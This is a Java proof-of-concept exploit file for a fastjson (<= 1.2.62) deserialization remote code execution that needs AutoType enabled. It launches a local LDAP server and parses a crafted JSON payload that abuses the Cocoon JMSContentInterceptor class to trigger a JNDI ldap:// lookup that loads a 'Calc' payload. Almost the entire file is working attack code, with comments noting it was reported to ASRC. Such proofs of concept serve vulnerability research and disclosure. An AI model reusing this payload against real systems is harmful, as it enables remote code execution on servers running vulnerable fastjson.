package com.threedr3am.bug.fastjson.rce;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
import com.threedr3am.bug.common.server.LdapServer;

/**
 * fastjson <= 1.2.62 RCE，需要开启AutoType (report by threedr3am to ASRC)
 *
 * PS：因为引用了javax/jms/JMSException类，所以必须在javaee环境下
 *
 * <dependency>
 *       <groupId>slide</groupId>
 *       <artifactId>slide-kernel</artifactId>
 *       <version>2.1</version>
 * </dependency>
 * <dependency>
 *       <groupId>cocoon</groupId>
 *       <artifactId>cocoon-slide</artifactId>
 *       <version>2.1.11</version>
 * </dependency>
 *
 * @author threedr3am
 */
public class CocoonSlidePoc {
  static {
    //rmi server示例
//    RmiServer.run();

    //ldap server示例
    LdapServer.run();
  }

  public static void main(String[] args) {
    ParserConfig.getGlobalInstance().setAutoTypeSupport(true);

    String fastjsonPayload = "{\"@type\":\"org.apache.cocoon.components.slide.impl.JMSContentInterceptor\", \"parameters\": {\"@type\":\"java.util.Hashtable\",\"java.naming.factory.initial\":\"com.sun.jndi.rmi.registry.RegistryContextFactory\",\"topic-factory\":\"ldap://127.0.0.1:43658/Calc\"}, \"namespace\":\"\"}";
    JSON.parse(fastjsonPayload);
  }
}
